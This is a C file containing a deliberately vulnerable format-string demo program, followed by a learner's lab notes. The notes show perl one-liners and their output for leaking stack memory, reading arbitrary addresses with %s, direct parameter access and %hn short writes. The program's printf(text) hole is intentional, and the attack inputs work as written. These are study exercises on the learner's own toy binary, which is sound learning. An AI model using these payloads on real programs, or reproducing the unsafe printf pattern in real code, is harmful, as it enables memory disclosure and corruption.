#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// gcc -g fmt_vuln.c -o fmt_vuln.out
int main(int argc, char *argv[]) {
  char text[1024];
  static int test_val = -72;

  if (argc < 2) {
    printf("Usage: %s <text to print>\n", argv[0]);
    exit(0);
  }
  strcpy(text, argv[1]);

  printf("The right way to print user-controlled input:\n");
  printf("%s", text);

  printf("\nThe wrong way to print user-controlled input:\n");
  printf(text);

  // Debug output
  printf("\n[*] test_val @ 0x%08x = %d 0x%08x\n", &test_val, test_val, test_val);
  exit(0);
}

/*

* If the appropriate function argument isn't there, adding to the frame pointer will reference a piece of memory in a preceding stack frame
* when the %x format parameter was used, the hexadecimal representation of a four-byte word in the stack was printed.
  This process can be used repeatedly to examine stack memory.
* Because the format function will always be on the highest stack frame,
  as long as theformat string has been stored anywhere on the stack,
  it will be located below the current frame pointer (at a higher memory address).
  This fact can be used to control arguments to the format function.
  It is particularly useful if format parameters that pass by reference are used, such as %s or %n

########## Reading from Arbitrary Memory Addresses ##########

OUTPUT

./fmt_vuln.out hello
The right way to print user-controlled input:
hello
The wrong way to print user-controlled input:
hello
[*] test_val @ 0x5656f008 = -72 0xffffffb8

./fmt_vuln.out hello%x
The right way to print user-controlled input:
hello%x
The wrong way to print user-controlled input:
helloff9e507c
[*] test_val @ 0x565f0008 = -72 0xffffffb8

./fmt_vuln.out $(perl -e 'print "%08x."x40')
The right way to print user-controlled input:
%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.
The wrong way to print user-controlled input:
ffe6ce3c.f7f702c9.566025c7.f7d80cb8.677f9a5f.f7f5f110.ffe6d2f4.00000001.00000001.f7d83dc8.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.
[*] test_val @ 0x56604008 = -72 0xffffffb8

# repeating pattern (little-endian) (?)
printf "\x25\x30\x38\x78\x2e\n"

The four bytes of 0x41 indicate that the 11th format parameter is reading from the beginning of the format string to get its data.
If the 11th format parameter is %s instead of %x, the format function will attempt to print the string located at 0x41414141

./fmt_vuln.out $(perl -e 'print "AAAA" . "%08x."x40')
./fmt_vuln.out $(perl -e 'print "AAAA" . "%08x."x11')
./fmt_vuln.out $(perl -e 'print "AAAA" . "%08x."x10 . "%s"')

./fmt_vuln.out $(perl -e 'print "AAAA" . "%08x."x11')
The right way to print user-controlled input:
AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.
The wrong way to print user-controlled input:
AAAAffcd23ec.f7f0a2c9.565ca5c7.f7d1acb8.677f9a5f.f7ef9110.ffcd28a4.00000001.00000001.f7d1ddc8.41414141.
[*] test_val @ 0x565cc008 = -72 0xffffffb8

./fmt_vuln.out $(perl -e 'print "\xaf\xbe\xad\xde" . "%08x."x11')
The right way to print user-controlled input:
����%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.
The wrong way to print user-controlled input:
����ffc27a9c.f7fc62c9.565da5c7.f7dd6cb8.677f9a5f.f7fb5110.ffc27f54.00000001.00000001.f7dd9dc8.deadbeaf.
[*] test_val @ 0x565dc008 = -72 0xffffffb8

printenv | grep PATH
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# >>> it changes every time !!!
./getenvaddr.out PATH ./fmt_vuln.out     
PATH will be at 0xff[950]f92
root@f53bbd5eab8d:/share/chapter03# ./getenvaddr.out PATH ./fmt_vuln.out
PATH will be at 0xff[eb9]f92

ff|95|0f|92
./fmt_vuln.out $(perl -e 'print "\x92\x0f\x95\xff" . "%08x."x10 . "%s"')

########## Writing to Arbitrary Memory Addresses ##########

* If the %s format parameter can be used to read an arbitrary memory address,
  you should be able to use the same technique with %n to write to an arbitrary memory address.

>>> test_val changes every time
>>> see chapter 0x354 for the technique

########## Direct Parameter Access ##########

* Direct parameter access allows parameters to be accessed directly by using the dollar sign qualifier.
  For example, %n$d would access the nth parameter and display it as a decimal number

# example
printf("7th: %7$d, 4th: %4$05d\n", 10, 20, 30, 40, 50, 60, 70, 80);
# output
7th: 70, 4th: 00040

./fmt_vuln.out $(perl -e 'print "AAAA" . "%08x."x11')

# escape dollar sign
# access 11th parameter
./fmt_vuln.out $(perl -e 'print "AAAA" . "%11\$x"')
The right way to print user-controlled input:
AAAA%11$x
The wrong way to print user-controlled input:
AAAA41414141
[*] test_val @ 0x56595008 = -72 0xffffffb8

########## Using Short Writes ##########

* A short is typically a two-byte word

./fmt_vuln.out $(perl -e 'print "AAAA" . "%08x."x10 . "%hn"')

>>> test_val changes every time
>>> see chapter 0x356 for the technique

*/
